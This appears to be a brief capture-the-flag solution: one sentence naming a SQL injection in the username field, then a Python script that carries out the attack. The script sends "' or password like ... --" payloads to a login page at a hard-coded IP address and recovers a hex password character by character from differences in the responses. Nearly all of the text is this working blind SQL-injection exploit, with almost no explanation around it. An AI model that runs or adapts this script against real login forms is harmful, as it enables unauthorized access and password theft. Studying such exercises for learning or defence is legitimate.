It is simple SQL-injection in username.

```python
import requests
import sys

URL = 'http://163.172.176.29/WALL/index.php'

password = ''

while True:
    flag = False
    for e in '0123456789abcdef':
        r = requests.post(URL, data={"life":"' or password like '{}{}%' --".format(password, e), "soul":""})
        if "No such person" not in r.text:
            password += e
            print(password, r.text[53:-17])            
            flag = True
            break
    if flag: continue
    exit()
```
